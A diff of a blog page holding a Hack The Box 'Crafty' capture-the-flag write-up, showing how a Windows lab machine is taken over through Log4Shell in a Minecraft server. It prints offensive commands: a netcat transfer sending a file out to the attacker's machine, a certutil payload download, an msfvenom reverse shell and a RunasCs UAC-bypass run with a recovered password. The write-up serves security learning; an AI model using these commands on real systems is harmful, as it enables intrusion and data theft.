@@ -5,9 +5,9 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Target IP - 10.10.11.249
-Scanning sudo nmap -sC -sV -p- -T5 -oA nmap/Crafty 10.10.11.249 Results
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST Nmap scan report for crafty.htb (10.10.11.249) Host is up (0.054s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Crafty - Official Website |_http-server-header: Microsoft-IIS/10." />
+<meta name="description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.
+Target IP - 10.10.11.249
+Scanning sudo nmap -sC -sV -p- -oA nmap/Crafty 10." />
 <meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -39,24 +39,24 @@ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST Nmap scan rep
 
 
 <meta itemprop="name" content="HTB: Crafty">
-<meta itemprop="description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Target IP - 10.10.11.249
-Scanning sudo nmap -sC -sV -p- -T5 -oA nmap/Crafty 10.10.11.249 Results
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST Nmap scan report for crafty.htb (10.10.11.249) Host is up (0.054s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Crafty - Official Website |_http-server-header: Microsoft-IIS/10."><meta itemprop="datePublished" content="2024-06-12T21:19:39-05:00" />
+<meta itemprop="description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.
+Target IP - 10.10.11.249
+Scanning sudo nmap -sC -sV -p- -oA nmap/Crafty 10."><meta itemprop="datePublished" content="2024-06-12T21:19:39-05:00" />
 <meta itemprop="dateModified" content="2024-06-12T21:19:39-05:00" />
-<meta itemprop="wordCount" content="785"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png" />
+<meta itemprop="wordCount" content="905"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png" />
 <meta itemprop="keywords" content="Hack The Box," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png" /><meta name="twitter:title" content="HTB: Crafty"/>
-<meta name="twitter:description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Target IP - 10.10.11.249
-Scanning sudo nmap -sC -sV -p- -T5 -oA nmap/Crafty 10.10.11.249 Results
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST Nmap scan report for crafty.htb (10.10.11.249) Host is up (0.054s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Crafty - Official Website |_http-server-header: Microsoft-IIS/10."/>
+<meta name="twitter:description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.
+Target IP - 10.10.11.249
+Scanning sudo nmap -sC -sV -p- -oA nmap/Crafty 10."/>
 
 
 
     <meta property="og:title" content="HTB: Crafty" />
-<meta property="og:description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Target IP - 10.10.11.249
-Scanning sudo nmap -sC -sV -p- -T5 -oA nmap/Crafty 10.10.11.249 Results
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST Nmap scan report for crafty.htb (10.10.11.249) Host is up (0.054s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Crafty - Official Website |_http-server-header: Microsoft-IIS/10." />
+<meta property="og:description" content="Platform: Hack The Box Link: Crafty Level: Easy OS: Windows Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.
+Target IP - 10.10.11.249
+Scanning sudo nmap -sC -sV -p- -oA nmap/Crafty 10." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://scorpiosec.com/posts/2024/06/htb-crafty/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Crafty/Crafty.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-06-12T21:19:39-05:00" />
@@ -166,7 +166,7 @@ if (!doNotTrack) {
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        4 minutes
+        5 minutes
 
          | Also available in
           
@@ -187,7 +187,15 @@ if (!doNotTrack) {
         <hr />
         <aside id="toc">
           <div class="toc-title">Table of Contents</div>
-          <nav id="TableOfContents"></nav>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escaltion">Privilege Escaltion</a></li>
+    <li><a href="#closing-words">Closing Words</a></li>
+  </ul>
+</nav>
         </aside>
         <hr />
 
@@ -203,9 +211,10 @@ if (!doNotTrack) {
 <li>OS: Windows</li>
 </ul>
 <hr>
+<p>Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (CVE-2021-44228) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.</p>
 <p>Target IP - <code>10.10.11.249</code></p>
-<h1 id="scanning">Scanning</h1>
-<pre tabindex="0"><code>sudo nmap -sC -sV -p- -T5 -oA nmap/Crafty 10.10.11.249
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>sudo nmap -sC -sV -p- -oA nmap/Crafty 10.10.11.249
 </code></pre><p><strong>Results</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-02-26 13:56 CST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> crafty.htb <span style="color:#f92672">(</span>10.10.11.249<span style="color:#f92672">)</span>
@@ -229,23 +238,27 @@ if (!doNotTrack) {
 </ul>
 <p>Even though there is no redirection let&rsquo;s add <code>crafty.htb</code> to our hosts file.</p>
 <pre tabindex="0"><code>sudo echo &#34;10.10.11.249 crafty.htb&#34; | sudo tee -a /etc/hosts
-</code></pre><p>When we go to the website we find a web page about a game called Crafty.</p>
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>When we go to the website we find a web page about a game called Crafty.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/crafty-webpage.png" alt="Crafty website"></p>
-<p>There is nothing interesting on the web application so far. I turned my attention to the Minecraft server. I google <code>minecraft 1.16.5 vulnerability</code> and found that there is a Log4j exploit for it with <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" >CVE-2021-44228</a>
+<p>There is nothing interesting on the web application so we turn our attention to the Minecraft server. When searching <code>minecraft 1.16.5 vulnerability</code> we find that there is a Log4j exploit for it with <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" >CVE-2021-44228</a>
 
 .</p>
+<blockquote>
+<p><code>play.crafty.htb</code> redirects us to the main website.</p>
+</blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/log4j-Minecraft.png" alt="Minecraft Log4j exploit"></p>
 <p>We then find a PoC for the exploit at this <a href="https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------" target="_blank" >Github repo</a>
 
 .</p>
-<p>After checking the content of <code>poc.py</code> I see that it is using <code>String cmd=&quot;/bin/sh&quot;;</code> which will not work on Windows. I asked ChatGPT to make it Windows compatible and it changed it to <code>String cmd=&quot;cmd.exe&quot;;</code>.</p>
+<p>After checking the content of <code>poc.py</code> we notice that it is using <code>String cmd=&quot;/bin/sh&quot;;</code> which will not work on Windows. In order to make it Windows compatible we change that line to <code>String cmd=&quot;cmd.exe&quot;;</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/log4j-poc-content.png" alt="Log4j PoC content"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/poc-python-change.png" alt="Log4j PoC content change"></p>
-<p>On the exploit page, you can read: &ldquo;<strong>Note:</strong> For this to work, the extracted java archive has to be named: <code>jdk1.8.0_20</code>, and be in the same directory.&rdquo;</p>
-<p>Going to the official website provided on the Github page we need to create an account. After searching around we found some java archives on <a href="https://repo.huaweicloud.com/java/" target="_blank" >https://repo.huaweicloud.com/java/</a>
+<p>On the exploit page, we read: &ldquo;<strong>Note:</strong> For this to work, the extracted java archive has to be named: <code>jdk1.8.0_20</code>, and be in the same directory.&rdquo;</p>
+<p>Going to the website provided on the Github page we are required to create an account. After searching around we find some java archives on <a href="https://repo.huaweicloud.com/java/" target="_blank" >https://repo.huaweicloud.com/java/</a>
 
-</p>
-<p>For a quick download and setup use the commands below</p>
+.</p>
+<p>For a quick download and setup use the commands below.</p>
 <pre tabindex="0"><code>#Make sure to download it in the log4j-shell-poc directory
 wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
 
@@ -253,12 +266,12 @@ tar -xf jdk-8u181-linux-x64.tar.gz
 
 #Rename the file
 mv jdk1.8.0_181 jdk1.8.0_20
-</code></pre><p>Now here are all our files.</p>
+</code></pre><h2 id="initial-foothold">Initial Foothold</h2>
+<p>Here are all our files.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/log4j-poc-files.png" alt="Log4j PoC files"></p>
-<p>We need a way to communicate with the Minecraft server. I found this tool named <a href="https://github.com/ammaraskar/pyCraft" target="_blank" >pyCraft</a>
+<p>We need a way to communicate with the Minecraft server, we will use <a href="https://github.com/ammaraskar/pyCraft" target="_blank" >pyCraft</a>
 
-.</p>
-<p>We need to setup a virtual environment for pyCraft.</p>
+ for that. Let&rsquo;s setup a virtual environment for pyCraft.</p>
 <pre tabindex="0"><code>virtualenv ENV
 
 source ENV/bin/activate
@@ -267,22 +280,24 @@ pip install -r requirements.txt
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Crafty/pyCraft-setup.png" alt="PyCraft setup"></p>
 <p>Now we setup a listener to catch the shell.</p>
 <pre tabindex="0"><code>rlwrap nc -lvnp 4444
-</code></pre><p>Then we start the log4j exploit.</p>
+</code></pre><p>Then we start the log4j exploit from the <code>log4j-shell-poc</code> directory.</p>
 <pre tabindex="0"><code>python3 poc.py --userip &lt;IP_ADDRESS&gt; --webport 80 --lport &lt;PORT_NUMBER&gt;
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Crafty/crafty-exploit.png" alt="Log4j exploit launch"></p>
-<p>From the pyCraft folder we run <code>start.py</code></p>
-<pre tabindex="0"><code>pip install -r requirements.txt
-
-python3 start.py
-</code></pre><p><img src="https://scorpiosec.com/images/HTB-Crafty/PyCraft-connection.png" alt="PyCraft"></p>
-<p>After you see the <code>Connected.</code> message in PyCraft. Copy the link provided on the line starting with <code>Send me:</code> in <code>log4j-shell-poc</code>, paste it in pyCraft then press <code>Enter</code> and you will catch a shell on your listener.</p>
+<p>From the <code>PyCraft</code> folder we run <code>start.py</code></p>
+<pre tabindex="0"><code>python3 start.py
+</code></pre><p>After the <code>Connected.</code> message appears in PyCraft. We copy the link provided on the line starting with <code>Send me:</code> in <code>log4j-shell-poc</code>, paste it in pyCraft then press <code>Enter</code> and we catch a shell on the listener.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Crafty/PyCraft-connection-link.png" alt="PyCraft"></p>
+<blockquote>
+<p>If PyCraft fails to connect to the server, resetting the box should solve the issue.</p>
+</blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/shell-minecraft.png" alt="svc_minecraft shell"></p>
 <p>The user flag is on the user desktop.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/crafty-user-flag.png" alt="Crafty user flag"></p>
-<p>Go to <code>c:\Users\svc_minecraft\server\plugins\</code> and you will find a <code>playercounter-1.0-SNAPSHOT.jar</code> file.</p>
-<p>To send that file to my Kali machine I used <code>nc.exe</code> (Netcat for Windows)</p>
+<h2 id="privilege-escaltion">Privilege Escaltion</h2>
+<p>In <code>c:\Users\svc_minecraft\server\plugins\</code> we find an archive named <code>playercounter-1.0-SNAPSHOT.jar</code>.</p>
+<p>To send that file to our local machine we use <code>nc.exe</code> (Netcat for Windows)</p>
 <ol>
-<li>We download <code>nc.exe</code> with</li>
+<li>Download <code>nc.exe</code> with</li>
 </ol>
 <pre tabindex="0"><code>wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
 </code></pre><ol start="2">
@@ -290,50 +305,61 @@ python3 start.py
 <p>Move into the <code>netcat-1.11</code> directory created after the extraction</p>
 </li>
 <li>
-<p>Start a Python server</p>
+<p>Start a web server with Python</p>
 </li>
 </ol>
 <pre tabindex="0"><code>python3 -m http.server
 </code></pre><ol start="4">
-<li>Back on my reverse shell I used the command below to download <code>nc.exe</code></li>
+<li>We download <code>nc.exe</code> on the target</li>
 </ol>
 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Crafty/nc.exe-ontarget.png" alt="netcat upload on target"></p>
 <ol start="5">
-<li>I setup a listener on my Kali machine with</li>
+<li>On our local machine we run</li>
 </ol>
 <pre tabindex="0"><code>nc -nlp 1235 &gt; playercounter-1.0-SNAPSHOT.jar
 </code></pre><ol start="6">
-<li>On the target I run</li>
+<li>Finally, we send the archive to our Kali machine</li>
 </ol>
 <pre tabindex="0"><code>.\nc.exe 10.10.14.222 1235 &lt; c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Crafty/archive-exfiltration.png" alt="Crafty archive exfiltration"></p>
-<p>The <code>playercounter-1.0-SNAPSHOT.jar</code> archive is now on my Kali machine. You have to stop the listener to regain control of your terminal on the target system.</p>
-<p>After extracting the archive, we get <code>Playercounter.class</code> in <code>/htb/crafty/playercounter/</code>. I used <a href="https://www.decompiler.com/" target="_blank" >decompiler.com</a>
-
- to decompile the file.</p>
 <blockquote>
-<p>A <code>.class</code> file is a compiled Java bytecode file. When you compile a Java source code file (<code>.java</code>), the Java compiler (<code>javac</code>) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in <code>.class</code> files.
-In the case <code>Playercounter.class</code> contains the compiled bytecode for the <code>Playercounter</code> Java class</p>
+<p>Stop the listener to regain control of the terminal on the target system.</p>
+</blockquote>
+<p>After extracting the archive, we get <code>Playercounter.class</code> in <code>/htb/crafty/playercounter/</code>which we decompile with <a href="https://www.decompiler.com/" target="_blank" >decompiler.com</a>
+
+.</p>
+<blockquote>
+<p>A <code>.class</code> file is a compiled Java bytecode file. When you compile a Java source code file (<code>.java</code>), the Java compiler (<code>javac</code>) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in <code>.class</code> files. In our case <code>Playercounter.class</code> contains the compiled bytecode for the <code>Playercounter</code> Java class.</p>
 </blockquote>
 <p>We find what looks like some credential (<code>s67u84zKq8IXw</code>) used when connecting to a service on port 27015 (typically used by online games).</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/playercount-file.png" alt="archive content credentials"></p>
 <p>We have a tool called <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >RunasCs</a>
 
- that enables us to execute processes with permissions different from our current ones. Our objective is to launch an Administrator shell from the current user <code>svc_minecraft</code>.</p>
+ that enables us to execute processes with permissions different from our current user&rsquo;s. Our objective is to get an Administrator shell from the current user <code>svc_minecraft</code>.</p>
 <p>Let&rsquo;s generate a payload with <code>msfvenom</code>.</p>
 <p><strong>Example</strong></p>
 <pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=&lt;YOUR IP ADDRESS&gt; lport=&lt;PORT NUMBER&gt; -f exe -a x64 --platform windows -o shell.exe
-</code></pre><p>Transfer <code>shell.exe</code> and <code>RunasCs.exe</code> to the target with the same method used for <code>nc.exe</code>.</p>
+</code></pre><p><code>shell.exe</code> and <code>RunasCs.exe</code> are transferred to the target using the same method employed for <code>nc.exe</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/files-on-target.png" alt="malicious file and runascs.exe on target"></p>
-<p>Setup another listener on the port you selected for your <code>msfvenom</code> payload.</p>
-<pre tabindex="0"><code>rlwrap -cAr nc -lvp 8010
-</code></pre><p>Use <code>runasCs</code> in conjunction with your payload on the target.</p>
+<p>We setup another listener on the port selected for the <code>msfvenom</code> payload.</p>
+<pre tabindex="0"><code>rlwrap -cAr nc -lvp &lt;PORT_NUMBER&gt;
+</code></pre><p>We then use <code>runasCs</code> in conjunction with the malicious file.</p>
 <pre tabindex="0"><code>.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
-</code></pre><p>You get an administrative shell on your new listener.</p>
+</code></pre><p>We get a connection on the listener, as <code>administrator</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/admin-shell.png" alt="admin shell"></p>
 <p>At <code>C:\Users\Administrator\Desktop</code> we find <code>root.txt</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Crafty/root-flag.png" alt="root flag"></p>
+<h2 id="closing-words">Closing Words</h2>
+<p>Log4j is considered one of the most severe vulnerability because it allows attackers to easily take over vulnerable systems. It is very important to be able to recognize and test for those popular vulnerabilities. If you want to learn more about it, below are a video and an article detailing it:</p>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=UhuL11JaECM&amp;ab_channel=IntotheShadows" target="_blank" >Apache Log4j: The Exploit that Almost Killed the Internet</a>
+
+</li>
+<li><a href="https://builtin.com/articles/log4j-vulerability-explained" target="_blank" >Log4J Vulnerability Explained: What It Is and How to Fix It</a>
+
+</li>
+</ul>
 
       </div>
     </article>
@@ -366,7 +392,7 @@ In the case <code>Playercounter.class</code> contains the compiled bytecode for 
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        785 Words
+        905 Words
       </p>
 
       <p>
